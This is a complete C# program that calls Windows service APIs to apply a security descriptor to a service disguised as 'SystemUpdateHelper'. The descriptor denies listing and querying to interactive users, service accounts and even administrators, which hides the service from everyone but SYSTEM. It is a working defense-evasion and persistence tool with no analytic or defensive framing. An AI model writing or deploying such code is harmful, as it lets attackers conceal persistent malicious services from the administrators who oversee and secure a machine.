using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace UpdateService
{
    class Program
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool SetServiceObjectSecurity(IntPtr hService, SecurityInfos dwSecurityInformation, byte[] lpSecurityDescriptor);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(string StringSecurityDescriptor, uint StringSDRevision, out IntPtr SecurityDescriptor, out uint SecurityDescriptorSize);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);

        const uint SERVICE_ALL_ACCESS = 0xF01FF;
        const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        const uint SECURITY_DACL_INFORMATION = 4;

        static void Main()
        {
            try
            {
                var scManager = OpenSCManager("", "", SC_MANAGER_ALL_ACCESS);
                if (scManager == IntPtr.Zero)
                    throw new Exception($"Failed to open SCManager: Error {Marshal.GetLastWin32Error()}");

                var service = OpenService(scManager, "SystemUpdateHelper", SERVICE_ALL_ACCESS);
                if (service == IntPtr.Zero)
                    throw new Exception($"Failed to open service 'SystemUpdateHelper': Error {Marshal.GetLastWin32Error()}");

                string sddl = "D:(D;;DCLC;;;IU)(D;;DCLC;;;SU)(D;;DCLC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)";
                if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, 1, out IntPtr sd, out uint sdSize))
                    throw new Exception($"Failed to convert SDDL: Error {Marshal.GetLastWin32Error()}");

                var rawSd = new byte[sdSize];
                Marshal.Copy(sd, rawSd, 0, (int)sdSize);

                if (!SetServiceObjectSecurity(service, (SecurityInfos)SECURITY_DACL_INFORMATION, rawSd))
                    throw new Exception($"Failed to set service security: Error {Marshal.GetLastWin32Error()}");

                Console.WriteLine("Service 'SystemUpdateHelper' security updated successfully. It is now hidden from non-SYSTEM users.");
                CloseServiceHandle(service);
                CloseServiceHandle(scManager);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                Console.WriteLine("Ensure 'SystemUpdateHelper' service is installed, you are running as Administrator, and the environment is Windows.");
            }
        }
    }
}